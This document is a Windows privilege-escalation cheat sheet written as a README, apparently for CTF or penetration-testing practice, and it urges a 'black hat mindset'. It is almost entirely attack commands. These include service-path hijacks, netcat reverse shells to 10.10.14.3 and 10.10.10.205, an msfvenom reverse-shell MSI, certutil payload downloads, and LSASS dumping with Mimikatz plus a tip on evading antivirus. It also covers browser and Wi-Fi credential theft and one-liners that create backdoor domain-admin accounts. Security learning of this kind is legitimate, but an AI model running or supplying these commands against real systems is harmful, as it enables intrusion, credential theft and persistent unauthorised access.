# Windows Privilege Escalation

This README is designed to help you learn how to escalate privileges on Windows systems in a structured, beginner-friendly way. Whether you're preparing for cybersecurity challenges or exploring real-world techniques, this guide will walk you through every step. Let's think like a black hat hacker—find every weakness, exploit it silently, and always have a backup plan.

## Table of Contents

- [Initial Enumeration](#initial-enumeration)
- [Handy Commands for Escalation](#handy-commands-for-escalation)
- [Credential Dumping](#credential-dumping)
- [Other Useful Commands](#other-useful-commands)
- [Advanced Techniques](#advanced-techniques)
- [Resources](#resources)

## Initial Enumeration

Start by understanding your environment—who you are, what the system looks like, and what you can access.

### Who Am I?

```powershell
whoami                # Displays your current username
echo %USERNAME%       # Confirms your username
```

### What Are My Privileges?

```powershell
whoami /priv         # Lists your privileges (e.g., SeImpersonatePrivilege for PrintNightmare exploits)
whoami /groups       # Shows group memberships (e.g., Administrators)
```

## System Overview

```powershell
systeminfo           # Displays detailed system info (OS version, patches)
[environment]::OSVersion.Version    # Checks Windows version via PowerShell
wmic qfe            # Lists installed patches
wmic product get name    # Shows installed programs for potential exploits
```

## Network Information

```powershell
ipconfig /all        # Gets IP address, DNS, and gateway details
arp -a              # Reviews ARP table for connected devices
route print         # Shows routing table for network paths
netstat -ano        # Displays active connections
netstat -anoy       # Checks network capabilities
```

## Users and Groups

```powershell
net user            # Lists all system users
net users           # Same as above, for lateral movement checks
net user <USERNAME> # Checks if a user is an admin or in special groups
net localgroup      # Lists all system groups
net localgroup administrators    # Shows admin group members
```

## Security Policies

```powershell
net accounts        # Displays password policy
Get-MpComputerStatus    # Checks Windows Defender status
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections    # Lists AppLocker rules
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone    # Tests AppLocker policy
```

## Processes and Services

```powershell
tasklist /svc       # Lists running processes and services
query user          # Shows logged-on users (Windows Pro/Enterprise/Server)
Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object UserName    # Shows logged-on users
wmic service get name,startname    # Lists services and start accounts
wmic service get name,startname | FINDSTR "NT"    # Filters for NT AUTHORITY/SYSTEM services
net start          # Lists running services
```

## Environment and Pipes

```powershell
set                # Displays environment variables
cmd /c echo %PATH% # Reviews path variable
pipelist.exe /accepteula    # Lists named pipes
gci \\.\pipe      # Lists named pipes with PowerShell
accesschk.exe /accepteula \\.\Pipe\lsass -v    # Reviews pipe permissions
```

## Handy Commands for Escalation

These commands help you exploit misconfigurations and escalate privileges. Note: Many commands require Administrator privileges.

### Service Exploitation

```powershell
sc.exe sdshow Dnscache    # Checks DNS Client service permissions
sc stop Dnscache         # Stops DNS Client service
sc start Dnscache        # Starts DNS Client service
sc query Dnscache        # Checks service status

# Modify service binary path
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

# List services with unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\" | findstr /i /v """"

# Modify service configuration
sc config UPNPHOST binPath= "C:\Tools\sirenMaint.exe" & sc config UPNPHOST obj= ".\LocalSystem" password= ""

# Configure service to run custom binary
sc config SSDPSRV binPath= "C:\inetpub\siren\sirenMaint.exe" & sc config SSDPSRV obj= ".\LocalSystem" password= "" & sc config SSDPSRV start= "demand"

# Stop and start service
net stop SSDPSRV & net start SSDPSRV

# PowerShell service modification
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService" -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

## File and Permission Manipulation

```powershell
dir /q C:\backups\wwwroot\web.config    # Check file ownership
takeown /f C:\backups\wwwroot\web.config    # Take ownership
Get-ChildItem -Path 'C:\backups\wwwroot\web.config' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}    # Confirm ownership
icacls "C:\backups\wwwroot\web.config" /grant lafi:F    # Modify ACL
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"    # Check service permissions
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"    # Replace service binary
```

## Driver Exploits

```powershell
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp    # Compile driver exploit
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "??C:\Tools\Capcom.sys"    # Add driver reference
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1    # Add driver type
.DriverView.exe /stext drivers.txt & cat drivers.txt | Select-String -pattern Capcom    # Check driver
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys    # Load driver
```

## Modern Privilege Escalation Tools

### PrintSpoofer
```powershell
c:\tools\PrintSpoofer.exe -i -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe"
```

### SharpUp
```powershell
c:\tools\SharpUp.exe audit
```

### PsService
```powershell
c:\tools\PsService.exe security AppReadiness
```

### PrivKit
```powershell
c:\tools\PrivKit.exe
```

### WinPEAS
```powershell
c:\tools\winpeas.exe
```

## Credential Dumping

### File Searches
```powershell
findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml
gc 'C:\Users\lafi\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
cd c:\Users\manoj\Documents & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
select-string -Path C:\Users\lafi\Documents\*.txt -Pattern password
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C: *.config
Get-ChildItem C: -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

### PowerShell History
```powershell
(Get-PSReadLineOption).HistorySavePath    # Confirm history path
gc (Get-PSReadLineOption).HistorySavePath    # Read history
```

## Credential Extraction with Mimikatz

### Step 1: Dump LSASS Memory
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### Step 2: Extract Credentials
```powershell
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### Alternative Direct Extraction
```powershell
mimikatz.exe "sekurlsa::logonpasswords" exit
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

> **Pro Tip**: To avoid AV detection, use an obfuscated version of Mimikatz or execute it in memory.

## Other Credential Extraction Tools

```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'    # Decrypt PowerShell credentials
cmdkey /list    # List saved credentials
.SharpChrome.exe logins /unprotect    # Retrieve Chrome credentials
.lazagne.exe -h    # View LaZagne help
.lazagne.exe all    # Run all LaZagne modules
Invoke-SessionGopher -Target WINLPE-SRV01    # Extract session info
```

## Wireless Credentials

```powershell
netsh wlan show profile    # View saved networks
netsh wlan show profile "Can'tHackThis" key=clear    # Get wireless passwords
```

## Other Useful Commands

### File Transfer
```powershell
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
certutil -encode file1 encodedfile
certutil -decode encodedfile file2
```

## AlwaysInstallElevated

```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
msiexec /i c:\users\lafi\desktop\aie.msi /quiet /qn /norestart
```

## Scheduled Tasks

```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask | select TaskName,State
```

## Permissions and Descriptions

```powershell
.accesschk64.exe /accepteula -s -d C:\Scripts
Get-LocalUser
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

## Disk Mounting (Linux)

```bash
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

## Exploit Suggester

GitHub Repository: [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

```bash
sudo python2.7 windows-exploit-suggester.py --update
python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
```

## Cross-Compilation

First, install mingw-w64:
```bash
apt-get install mingw-w64
```

Then compile Windows executables:
```bash
i686-w64-mingw32-gcc hello.c -o hello32.exe        # 32-bit from C
x86_64-w64-mingw32-gcc hello.c -o hello64.exe      # 64-bit from C
i686-w64-mingw32-g++ hello.cc -o hello32.exe       # 32-bit from C++
x86_64-w64-mingw32-g++ hello.cc -o hello64.exe     # 64-bit from C++
```

### Notes:
- Ensure `hello.c` or `hello.cc` contains your code
- Use these to target both 32-bit and 64-bit Windows systems

## Permission Enumeration

Download [Sysinternals Suite](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) for these commands:

```powershell
# Check service permissions
accesschk.exe -ucqv [service_name]
accesschk.exe -uwcqv "Authenticated Users" *

# Find writable folders
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\

# Find writable files
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

## User Management

### Local Admin User
```powershell
cmd.exe /c net user manoj superPassword /add & cmd.exe /c net localgroup administrators manoj /add & cmd.exe /c net localgroup "Remote Desktop Users" manoj /add
```

### Domain Admin User
```powershell
cmd.exe /c net user manoj superPassword /add & net localgroup Administrators manoj /ADD /DOMAIN & net localgroup "Remote Desktop Users" manoj /ADD /DOMAIN & net group "Domain Admins" manoj /ADD /DOMAIN & net group "Enterprise Admins" manoj /ADD /DOMAIN & net group "Schema Admins" manoj /ADD /DOMAIN & net group "Group Policy Creator Owners" manoj /ADD /DOMAIN
```

## Program Files Check

```powershell
cd "C:\Program Files" & DIR /A /O /Q
cd "C:\Program Files (x86)" & DIR /A /O /Q
```

## Firewall and Network Info

```powershell
# Check firewall rules
netsh advfirewall firewall show rule name=all
netsh advfirewall firewall show rule name=inbound
netsh advfirewall firewall show rule name=outbound

# Display firewall info
netsh firewall show state
netsh firewall show config

# Gather network info
netstat -anoy
route print
arp -A
ipconfig /all
```

## Shares

```powershell
# List shares
net share
net use

# Create share
NET SHARE <sharename>=<drive/folderpath> /remark: "This is my share."

# Mount share
NET USE Z: \\COMPUTER_NAME\SHARE_NAME /PERSISTENT:YES

# Unmount share
NET USE Z: /DELETE

# Delete share
NET SHARE /DELETE
```

## Pro Tip

To avoid Command Prompt hanging, prefix commands with `cmd.exe /c`:

```powershell
# Might hang:
net user manoj superPassword /add

# Won't hang:
cmd.exe /c net user manoj superPassword /add

# Opens new window:
cmd.exe /c start notepad
```

## Resources

- FuzzySecurity Windows Privesc
- HackTricks Windows Privesc
- SharpGPOAbuse
- Windows-Exploit-Suggester
- Meterpreter Basics
- Maintaining Access with Meterpreter

## Black Hat Mindset

- **Be Relentless**: Always assume there's a weakness—check every service, file, and registry key.
- **Stay Stealthy**: Use `certutil` for file transfers and `meterpreter` persistence to avoid detection.
- **Think Creatively**: Exploit unquoted service paths, scheduled tasks, or even forgotten shares.
- **Adapt Quickly**: If one method fails, pivot to another—there's always a way in.

